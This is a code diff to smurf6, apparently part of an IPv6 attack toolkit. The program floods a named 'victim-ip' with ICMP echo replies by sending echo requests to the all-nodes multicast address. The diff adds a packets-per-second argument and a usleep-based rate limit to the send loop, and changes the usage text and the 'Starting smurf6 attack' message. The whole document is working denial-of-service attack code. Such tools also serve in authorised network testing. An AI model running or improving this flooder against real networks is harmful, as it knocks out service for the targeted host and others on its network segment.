@@ -12,9 +12,10 @@
 
 void help(char *prg) {
   printf("%s %s (c) 2016 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
-  printf("Syntax: %s interface victim-ip [multicast-network-address]\n\n", prg);
+  printf("Syntax: %s interface victim-ip packageCountPerSec [multicast-network-address]\n\n", prg);
   printf("Smurf the target with icmp echo replies. Target of echo request is the\n");
   printf("local all-nodes multicast address if not specified\n");
+  printf("packageCountPerSec set send packages count per second\n");
 //  printf("Use -r to use raw mode.\n\n");
   exit(-1);
 }
@@ -25,6 +26,8 @@ int main(int argc, char *argv[]) {
   int pkt_len = 0;
   char *interface;
   int rawmode = 0;
+
+  unsigned int packagesPerSec=100;
 
   if (argc < 3 || strncmp(argv[1], "-h", 2) == 0)
     help(argv[0]);
@@ -41,9 +44,14 @@ int main(int argc, char *argv[]) {
     fprintf(stderr, "Error: invalid interface %s\n", interface);
     exit(-1);
   }
-  victim6 = thc_resolve6(argv[2]);
-  if (argv[3] != NULL)
-    multicast6 = thc_resolve6(argv[3]);
+ victim6 = thc_resolve6(argv[2]);
+   packagesPerSec=atoi(argv[3]);
+  if(packagesPerSec<=0 || packagesPerSec>100000){
+      printf("packagesPerSec set error!should less than 100000!\n");
+      exit(-1);
+  }
+  if (argv[4] != NULL)
+    multicast6 = thc_resolve6(argv[4]);
   else
     multicast6 = thc_resolve6("ff02::1");
 
@@ -57,9 +65,11 @@ int main(int argc, char *argv[]) {
     exit(-1);
   }
 
-  printf("Starting smurf6 attack against %s (Press Control-C to end) ...\n", argv[2]);
-  while (1)
-    thc_send_pkt(interface, pkt, &pkt_len);
+  printf("Starting smurf6 attack against %s %d per second (Press Control-C to end) ...\n", argv[2],packagesPerSec);
 
+  while (1){
+      usleep(1000000/packagesPerSec);
+      thc_send_pkt(interface, pkt, &pkt_len);
+  }
   return 0;
 }
